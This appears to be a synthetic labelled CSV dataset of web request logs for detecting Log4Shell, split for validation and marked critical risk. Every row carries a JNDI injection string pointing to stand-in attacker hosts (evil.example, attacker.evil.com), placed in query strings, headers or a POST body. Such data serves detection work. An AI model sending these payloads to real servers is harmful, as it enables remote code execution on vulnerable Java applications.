id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000181,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://evil.example/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://evil.example/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000182,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://evil.example/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://evil.example/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000183,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://evil.example/header} | Method: GET | Host: app.local | Path: /login,request from user-agent: user-agent: ${jndi:ldap://evil.example/header} | method: get | host: app.local | path: /login,1,log4shell,plain,user_agent,val,critical
LS-000184,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://evil.example/header},request from user-agent: user-agent: ${jndi:ldap://evil.example/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000185,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: User-Agent: ${jndi:ldap://evil.example/header},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: user-agent: ${jndi:ldap://evil.example/header},1,log4shell,plain,x_api_version,val,critical
LS-000186,2026-05-17,synthetic,GET /search?q=User-Agent: ${jndi:ldap://evil.example/header} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=user-agent: ${jndi:ldap://evil.example/header} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,plain,path,val,critical
LS-000187,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=User-Agent: ${jndi:ldap://evil.example/header},post /search http/1.1 host: app.local body: query=user-agent: ${jndi:ldap://evil.example/header},1,log4shell,plain,body,val,critical
LS-000188,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://evil.example/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://evil.example/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000189,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://evil.example/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://evil.example/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000190,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://evil.example/header} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: user-agent: ${jndi:ldap://evil.example/header} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,val,critical
LS-000191,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://evil.example/header},request from user-agent: user-agent: ${jndi:ldap://evil.example/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000192,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: User-Agent: ${jndi:ldap://evil.example/header},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: user-agent: ${jndi:ldap://evil.example/header},1,log4shell,plain,x_api_version,val,critical
LS-000385,2026-05-17,synthetic,GET /?q=User-Agent: ${jndi:ldap://attacker.evil.com/header} HTTP/1.1,get /?q=user-agent: ${jndi:ldap://attacker.evil.com/header} http/1.1,1,log4shell,plain,minimal_query,val,critical
LS-000386,2026-05-17,synthetic,GET /api/check?debug=User-Agent: ${jndi:ldap://attacker.evil.com/header} HTTP/1.1 Host: app.local,get /api/check?debug=user-agent: ${jndi:ldap://attacker.evil.com/header} http/1.1 host: app.local,1,log4shell,plain,uri_param,val,critical
LS-000387,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://attacker.evil.com/header} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: user-agent: ${jndi:ldap://attacker.evil.com/header} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,val,critical
LS-000388,2026-05-17,synthetic,Request from User-Agent: User-Agent: ${jndi:ldap://attacker.evil.com/header},request from user-agent: user-agent: ${jndi:ldap://attacker.evil.com/header},1,log4shell,plain,user_agent_minimal,val,critical
LS-000389,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: User-Agent: ${jndi:ldap://attacker.evil.com/header},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /metrics | x-api-version: user-agent: ${jndi:ldap://attacker.evil.com/header},1,log4shell,plain,x_api_version,val,critical
